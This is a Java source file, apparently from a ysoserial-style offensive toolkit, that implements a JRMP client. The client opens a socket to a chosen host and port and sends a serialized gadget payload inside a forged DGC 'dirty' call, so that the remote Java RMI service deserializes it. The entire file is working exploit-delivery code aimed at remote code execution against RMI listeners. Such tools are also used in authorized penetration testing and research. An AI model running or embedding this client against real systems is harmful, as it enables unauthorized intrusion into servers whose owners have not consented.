package com.h2tg.ysogate.server;


import com.h2tg.ysogate.Main;
import sun.rmi.transport.TransportConstants;

import javax.net.SocketFactory;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.*;


/**
 * Generic JRMP client
 * <p>
 * Pretty much the same thing as {@link RMIRegistryExploit} but
 * - targeting the remote DGC (Distributed Garbage Collection, always there if there is a listener)
 * - not deserializing anything (so you don't get yourself exploited ;))
 *
 * @author mbechler
 */
@SuppressWarnings({
		"restriction"
})
public class JRMPClient {

	public static final void main(final String[] args) {
		if (args.length < 5) {
			System.err.println(JRMPClient.class.getName() + " <host> <port> <args...>");
			System.exit(-1);
		}

		String hostname = args[0];
		int    port     = Integer.parseInt(args[1]);

		// 去除前两个参数
		String[] newArray = new String[args.length - 2];
		System.arraycopy(args, 2, newArray, 0, newArray.length);

		Main.main(newArray);
		Object payloadObject = Main.PAYLOAD;

		try {
			System.err.println(String.format("* Opening JRMP socket %s:%d", hostname, port));
			makeDGCCall(hostname, port, payloadObject);
		} catch (Exception e) {
			e.printStackTrace(System.err);
		}
	}

	public static void makeDGCCall(String hostname, int port, Object payloadObject) throws IOException, UnknownHostException, SocketException {
		InetSocketAddress isa = new InetSocketAddress(hostname, port);
		Socket            s   = null;
		DataOutputStream  dos = null;
		try {
			s = SocketFactory.getDefault().createSocket(hostname, port);
			s.setKeepAlive(true);
			s.setTcpNoDelay(true);

			OutputStream os = s.getOutputStream();
			dos = new DataOutputStream(os);

			dos.writeInt(TransportConstants.Magic);
			dos.writeShort(TransportConstants.Version);
			dos.writeByte(TransportConstants.SingleOpProtocol);

			dos.write(TransportConstants.Call);

			@SuppressWarnings("resource") final ObjectOutputStream objOut = new MarshalOutputStream(dos);

			objOut.writeLong(2); // DGC
			objOut.writeInt(0);
			objOut.writeLong(0);
			objOut.writeShort(0);

			objOut.writeInt(1); // dirty
			objOut.writeLong(-669196253586618813L);

			objOut.writeObject(payloadObject);

			os.flush();
		} finally {
			if (dos != null) {
				dos.close();
			}
			if (s != null) {
				s.close();
			}
		}
	}

	static final class MarshalOutputStream extends ObjectOutputStream {


		private URL sendUrl;

		public MarshalOutputStream(OutputStream out, URL u) throws IOException {
			super(out);
			this.sendUrl = u;
		}

		MarshalOutputStream(OutputStream out) throws IOException {
			super(out);
		}

		@Override
		protected void annotateClass(Class<?> cl) throws IOException {
			if (this.sendUrl != null) {
				writeObject(this.sendUrl.toString());
			} else if (!(cl.getClassLoader() instanceof URLClassLoader)) {
				writeObject(null);
			} else {
				URL[]  us = ((URLClassLoader) cl.getClassLoader()).getURLs();
				String cb = "";

				for (URL u : us) {
					cb += u.toString();
				}
				writeObject(cb);
			}
		}


		/**
		 * Serializes a location from which to load the specified class.
		 */
		@Override
		protected void annotateProxyClass(Class<?> cl) throws IOException {
			annotateClass(cl);
		}
	}


}
